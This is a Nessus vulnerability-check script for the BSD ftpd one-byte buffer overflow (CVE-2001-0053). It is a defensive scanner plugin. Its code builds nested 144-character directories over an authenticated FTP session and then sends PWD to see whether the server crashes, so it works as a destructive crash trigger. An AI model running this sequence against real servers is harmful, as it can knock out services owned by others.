#
#
# (C) Tenable Network Security
#
# This script was written by Xue Yong Zhi <yong@tenablesecurity.com>
#
#

if(description)
{
 script_id(11371);
 script_bugtraq_id(2124);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2001-0053");
 name["english"] = "BSD ftpd Single Byte Buffer Overflow";

 script_name(english:name["english"]);

 desc["english"] = "
One-byte buffer overflow in replydirname function
in BSD-based ftpd allows remote attackers to gain
root privileges.

Solution : upgrade your FTP server.
Consider removing directories writable by 'anonymous'.

Risk factor : High";

 script_description(english:desc["english"]);


 script_summary(english:"Checks if the remote ftp can be buffer overflown",
 		francais:"Détermine si le serveur ftp distant peut etre soumis a un dépassement de buffer");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");

 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");

 script_dependencie("find_service.nes", "ftp_writeable_directories.nasl");
 script_require_keys("ftp/login", "ftp/writeable_dir");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here :
#
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
 
 #TODO
 
 exit(0);
}


function clean_exit()
{
  soc = open_sock_tcp(port);
  if ( soc )
  {
  ftp_authenticate(socket:soc, user:login, pass:pass);
  send(socket:soc, data:string("CWD ", wri, "\r\n"));
  r = ftp_recv_line(socket:soc);
  for(j=0;j<num_dirs - 1;j=j+1)
  {
   send(socket:soc, data:string("CWD ", crap(144), "\r\n"));
   r = ftp_recv_line(socket:soc);
  }

  for(j=0;j<num_dirs;j=j+1)
  {
   send(socket:soc, data:string("RMD ", crap(144),  "\r\n"));
   r = ftp_recv_line(socket:soc);
   if(!egrep(pattern:"^250 .*", string:r))exit(0);
   send(socket:soc, data:string("CWD ..\r\n"));
   r = ftp_recv_line(socket:soc);
  }
 }
}


# First, we need anonymous access

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

if(!login)exit(0);

# Then, we need a writeable directory
wri = get_kb_item("ftp/writeable_dir");
if(!wri)exit(0);

nomkdir = get_kb_item("ftp/no_mkdir");
if(nomkdir)exit(0);

# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:pass))
 {
  num_dirs = 0;
  # We are in

  c = string("CWD ", wri, "\r\n");
  send(socket:soc, data:c);
  b = ftp_recv_line(socket:soc);
  cwd = string("CWD ", crap(144), "\r\n");
  mkd = string("MKD ", crap(144), "\r\n");
  pwd = string("PWD \r\n");

  #
  # Repeat the same operation 20 times. After the 20th, we
  # assume that the server is immune.
  #


  for(i=0;i<20;i=i+1)
  {
  send(socket:soc, data:mkd);
  b = ftp_recv_line(socket:soc);

  # No answer = the server has closed the connection.
  # The server should not crash after a MKD command
  # but who knows ?

  if(!b){
  	#security_hole(port);
	clean_exit();
	}

  if(!egrep(pattern:"^257 .*", string:b))
  {
   i = 20;
  }
  else
  {
  send(socket:soc,data:cwd);
  b = ftp_recv_line(socket:soc);

  #
  # See above. The server is unlikely to crash
  # here

  if(!b)
       {
  	#security_hole(port);
	clean_exit();
       }

   if(!egrep(pattern:"^250 .*", string:b))
   {
    i = 20;
   }
   else num_dirs = num_dirs + 1;
   }
  }

  #
  #If vunerable, it will crash here
  #
  send(socket:soc,data:pwd);
  b = ftp_recv_line(socket:soc);
  if(!b)
       {
  	security_hole(port);
	clean_exit();
       }

  ftp_close(socket:soc);
 }
}
